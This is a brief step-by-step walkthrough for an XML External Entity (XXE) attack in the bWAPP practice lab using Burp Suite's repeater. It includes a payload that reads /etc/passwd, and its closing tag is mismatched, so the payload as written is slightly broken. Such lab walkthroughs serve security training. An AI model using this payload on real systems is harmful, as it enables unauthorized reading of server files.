1. Go to XML External Entity Attacks (XXE) in bWAPP
2. Turn intrecept on in burp suite
3. Click on Any bugs?
4. Send the request to the repeater feature and add an XML entity that fetches /etc/passwd and forward the request:
    
	<!DOCTYPE login[<!ENTITY hacked SYSTEM "/etc/passwd">]>
	<reset><login>&hacked;</login><secret>Any bugs?</secret></rest>